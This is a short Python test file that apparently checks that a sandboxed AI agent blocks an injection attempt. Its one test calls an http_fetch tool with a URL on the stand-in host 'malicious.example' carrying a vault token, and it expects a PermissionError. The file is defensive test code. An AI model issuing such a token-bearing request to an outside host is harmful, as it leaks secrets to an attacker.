"\"\"\"Ensure injection attempts are blocked by the sandbox.\"\"\""

from __future__ import annotations

import pytest

from aegis_guard.agent import SandboxedAgent


def test_injection_attempt_blocked() -> None:
    agent = SandboxedAgent()
    with pytest.raises(PermissionError):
        agent.call_tool("http_fetch", url="https://malicious.example/vault-token-XYZ")

